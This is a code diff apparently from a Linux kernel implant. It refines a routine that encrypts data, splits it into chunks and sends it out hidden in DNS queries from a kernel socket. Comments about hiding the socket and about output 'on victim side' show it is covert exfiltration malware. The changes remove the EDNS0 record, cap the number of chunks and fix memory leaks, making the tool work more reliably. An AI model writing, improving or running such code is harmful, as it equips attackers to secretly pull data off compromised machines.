@@ -16,6 +16,7 @@ struct dns_header_t {
     __be16 arcount; // Number of additional RRs (OPT for EDNS0)
 };
 #pragma pack(pop)
+// so 12 bytes total
 
 /**
  * @brief Send a single DNS question and receive the raw response.
@@ -49,7 +50,7 @@ static int dns_send_query(const char *query_name, __be16 question_type, u8 *resp
     get_random_bytes(&hdr->id, sizeof(hdr->id));
     hdr->flags = htons(0x0100); // RD = 1 (recursion desired)
     hdr->qdcount = htons(1);    // One question
-    hdr->arcount = htons(1);    // One OPT record for EDNS0
+    hdr->arcount = 0;    // One OPT record for EDNS0
     offset = DNS_HDR_SIZE;
 
     // Encode QNAME: split labels by '.' and prefix length
@@ -75,17 +76,6 @@ static int dns_send_query(const char *query_name, __be16 question_type, u8 *resp
     offset += 2;
     *(__be16 *)(packet_buffer + offset) = htons(1);
     offset += 2;
-
-    // Append EDNS0 OPT record for 4096-byte UDP payload
-    packet_buffer[offset++] = 0;
-    *(__be16 *)(packet_buffer + offset) = htons(41);
-    offset += 2; // TYPE = OPT
-    *(__be16 *)(packet_buffer + offset) = htons(DNS_MAX_BUF);
-    offset += 2; // UDP size
-    *(__be32 *)(packet_buffer + offset) = htonl(0x8000);
-    offset += 4; // DO bit
-    *(__be16 *)(packet_buffer + offset) = htons(0);
-    offset += 2; // RDLEN = 0
 
     // Create a UDP socket in kernel (need to hide it ?)
     result = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
@@ -160,14 +150,24 @@ int dns_send_data(const char *data, size_t data_len) {
         return -EIO;
 
     size_t total_chunks = (encrypted_len + DNS_MAX_CHUNK - 1) / DNS_MAX_CHUNK;
+
+    // Too many chunks, refuse to send, arbitrarily limit to DNS_MAX_AUTHORIZED_NB_CHUNKS
+    if (total_chunks > DNS_MAX_AUTHORIZED_NB_CHUNKS) {
+        kfree(encrypted_msg);
+        dns_send_data("Output on victim side too big. Use TCP instead", 47);
+        return -E2BIG;
+    }
+
     size_t chunk_index;
     int response_length_local;
     u8 *response_buffer_local;
 
     // Allocate local response buffer
     response_buffer_local = kzalloc(DNS_MAX_BUF, GFP_KERNEL);
-    if (!response_buffer_local)
+    if (!response_buffer_local) {
+        kfree(encrypted_msg);
         return -ENOMEM;
+    }
 
     // Loop over each data chunk
     for (chunk_index = 0; chunk_index < total_chunks; chunk_index++) {
@@ -196,6 +196,7 @@ int dns_send_data(const char *data, size_t data_len) {
     }
 
     // Marie Kondo
+    kfree(encrypted_msg);
     kfree(response_buffer_local);
     return 0;
 }
